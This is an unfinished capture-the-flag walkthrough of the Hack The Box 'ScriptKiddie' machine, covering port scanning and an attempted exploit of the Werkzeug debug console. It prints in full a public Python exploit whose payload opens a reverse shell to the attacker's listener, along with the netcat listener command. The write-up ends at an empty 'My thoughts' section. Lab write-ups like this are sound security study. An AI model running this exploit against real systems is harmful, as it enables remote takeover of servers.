---
title: "ScriptKiddie"
author: "Me"
date: "March 18, 2021"
output: html_document
---

# ScriptKiddie

 <div id="boxinfo">
 <div id="textbox">
 <p class="alignleft">**Difficulty**: easy (4.1/10)</p>
 <p class="aligncenter">**Type**: CTF</p>
 <p class="alignright">**OS**: Linux</p>
 </div>
 <div style="clear: both;"></div>
 </div> 

<div class="img_container">
![desc]({{https://jsom1.github.io/}}/_images/htb_sk_desc.png){: height="250px" width = "280px"}
</div>

**Tools:** \\
**Techniques:** \\
**Keywords:** \\


## 1. Port scanning
{:style="color:DarkRed; font-size: 170%;"}

As usual, let's perform a nmap scan with the flags *-sV* to have a verbose output, *-O* to enable OS detection, and *-sC* to enable the most common scripts scan.

<div class="img_container">
![nmap]({{https://jsom1.github.io/}}/_images/htb_sk_nmap.png)
</div>

There's only SSH and a web server running, let's have a look at this latter.

## 2. Find and exploit vulnerabilities
{:style="color:DarkRed; font-size: 170%;"}

We browse to 10.10.10.226:5000 and find the following page:

<div class="img_container">
![web site]({{https://jsom1.github.io/}}/_images/htb_sk_site.png)
</div>

While will try its functionnalities, we start dirbuster in the background:

````
sudo dirb http://10.10.10.226:5000 -r
`````
We see the web server is "Werkzeug", so let's search for an exploit related to it in the tool (it's the third tool on the page si it's not in the image above):

<div class="img_container">
![try tool]({{https://jsom1.github.io/}}/_images/htb_sk_tool.png)
</div>

It indeed returns two exploits. Since *dirb* didn't find anything, we will have a deeper look at those exploits. There are two of them, the first one is a python exploit while the latter is a ruby script that is part of the Metasploit framework. Metasploit's multi/handler often provides more stable revershe shells, but let's try the python one first. We can see its content with *cat /usr/share/exploitdb/exploits/multiple/remote/43905.py*, which is the following:

````
#!/usr/bin/env python
import requests
import sys
import re
import urllib

# usage : python exploit.py 192.168.56.101 5000 192.168.56.102 4422 

if len(sys.argv) != 5:
    print "USAGE: python %s <ip> <port> <your ip> <netcat port>" % (sys.argv[0])
    sys.exit(-1)


response = requests.get('http://%s:%s/console' % (sys.argv[1],sys.argv[2]))

if "Werkzeug " not in response.text:
    print "[-] Debug is not enabled"
    sys.exit(-1)

# since the application or debugger about python using python for reverse connect 
cmd = '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);''' % (sys.argv[3],sys.argv[4])

__debugger__ = 'yes'

frm = '0'

response = requests.get('http://%s:%s/console' % (sys.argv[1],sys.argv[2]))

secret = re.findall("[0-9a-zA-Z]{20}",response.text)

if len(secret) != 1:
    print "[-] Impossible to get SECRET"
    sys.exit(-1)
else:
    secret = secret[0]
    print "[+] SECRET is: "+str(secret)

# shell
print "[+] Sending reverse shell to %s:%s, please  use netcat listening in %s:%s" % (sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4])

raw_input("PRESS ENTER TO EXPLOIT")

data = {
        '__debugger__' : __debugger__,
        'cmd' : str(cmd),
        'frm' : frm,
        's' : secret
        }


response = requests.get("http://%s:%s/console" % (sys.argv[1],sys.argv[2]), params=data,headers=response.headers)

print "[+] response from server"
print "status code: " + str(response.status_code)
print "response: "+ str(response.text)
`````
This script seems to be honest and easy to use. It will ask us to setup a netcat listener at some point. Let's just try it. I fist copy the script on my desktop with *cp /usr/share/exploitdb/exploits/multiple/remote/43905.py .*. We then use it with the syntax *python exploit.pty target_IP target_port my_IP netcat_port*. I'll set up the listener on port 4444 with the command *sudo nc -nlvp 4444*. We get our ip with *sudo ifconfig tun0*. We can then try the script:

<div class="img_container">
![exploit fail]({{https://jsom1.github.io/}}/_images/htb_sk_fail.png)
</div>

We see in the script above that this error is returned if "Werkzeug " is not in the response of the GET request "GET http://10.10.10.226:5000/console". We can use Burp or Wireshark to see it in details. I'll use Wireshk this time. We just have to capture traffic on the tun0 interface and try the previous command once again. We then see the three-ways handshake and the GET request among all the packets:

<div class="img_container">
![wireshark packets]({{https://jsom1.github.io/}}/_images/htb_sk_ws1.png)
</div>

We an right click on this packet and select *Follow* -> *TCP stream*. We then see the response of the server:

<div class="img_container">
![TCP stream]({{https://jsom1.github.io/}}/_images/htb_sk_ws2.png)
</div>

Unsurprisingly, we see the file *console* was not found.



<ins>**My thoughts**</ins>



